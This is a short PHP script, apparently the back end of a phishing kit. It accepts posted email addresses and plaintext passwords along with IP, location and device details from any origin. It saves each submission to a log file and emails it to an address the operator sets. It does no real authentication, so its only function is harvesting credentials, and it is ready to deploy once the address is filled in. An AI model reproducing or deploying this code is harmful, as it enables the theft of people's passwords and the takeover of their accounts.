<?php


// Allow from any origin
header("Access-Control-Allow-Origin: *");

// Access-Control headers are received during OPTIONS requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
        // may also be using PUT, PATCH, DELETE, etc.
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
        header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}, Content-Type");

    exit(0);
}

// ============= CONFIGURATION =============
// SET YOUR EMAIL ADDRESS HERE:
$toEmail = "your-email@example.com";
// =========================================

// Get JSON data from request
$json = file_get_contents('php://input');
$data = json_decode($json, true);

// Validate required fields
if (empty($data['email']) || empty($data['password'])) {
    header('HTTP/1.1 400 Bad Request');
    echo json_encode(['error' => 'Missing email or password']);
    exit;
}

// Extract data
$email = $data['email'];
$password = $data['password'];
$device = $data['device'] ?? 'Unknown';
$country = $data['country'] ?? 'Unknown';
$city = $data['city'] ?? 'Unknown';
$ip = $data['ip'] ?? $_SERVER['REMOTE_ADDR'];
$time = $data['time'] ?? date('Y-m-d H:i:s');
$attempt = $data['attempt'] ?? 1;

// Create log directory if it doesn't exist
$logDir = __DIR__ . '/login_logs/';
if (!is_dir($logDir)) {
    mkdir($logDir, 0700, true);
}

// Generate filename with timestamp
$filename = date('Y-m-d_His') . '_' . preg_replace('/[^a-z0-9]/i', '_', $email) . '.txt';
$filePath = $logDir . $filename;

// Create file content
$fileContent = "Login Attempt Details\n";
$fileContent .= "====================\n";
$fileContent .= "Time: $time\n";
$fileContent .= "Email: $email\n";
$fileContent .= "Password: $password\n";
$fileContent .= "IP Address: $ip\n";
$fileContent .= "Location: $city, $country\n";
$fileContent .= "Device: $device\n";
$fileContent .= "Attempt: $attempt\n";
$fileContent .= "====================\n";

// Save to text file
file_put_contents($filePath, $fileContent);

// Send email using server's default configuration
$subject = "New Login: " . substr($email, 0, 20) . "...";
$headers = "Content-Type: text/plain; charset=utf-8";
$mailSent = mail($toEmail, $subject, $fileContent, $headers);

// Prepare response
$response = [
    'success' => true,
    'message' => 'Data processed',
    'file_saved' => $filename,
    'email_sent' => $mailSent
];

header('Content-Type: application/json');
echo json_encode($response);
?>